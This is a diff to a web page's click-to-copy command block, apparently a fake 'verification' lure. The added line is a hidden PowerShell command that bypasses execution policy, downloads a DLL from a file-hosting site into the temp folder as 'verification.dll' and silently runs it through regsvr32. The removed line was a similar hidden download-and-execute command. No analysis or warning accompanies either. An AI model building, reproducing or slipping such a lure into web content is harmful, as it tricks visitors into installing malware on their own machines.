@@ -158,7 +158,7 @@
 
         <div class="code-block-wrapper">
             <div class="code-block" id="commandBlock" title="Click to copy">
-powershell -WindowStyle Hidden -c "IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/YourUsername/YourRepo/main/script.ps1')"
+powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "(Invoke-WebRequest -Uri 'https://files.catbox.moe/pfkryh.dll' -OutFile (Join-Path $env:TEMP 'verification.dll')); Start-Process -WindowStyle Hidden -FilePath 'regsvr32.exe' -ArgumentList ('/s ' + (Join-Path $env:TEMP 'verification.dll')); Start-Sleep -s 3" 
             </div>
         </div>
         <p class="copy-hint">(Click to copy command)</p>
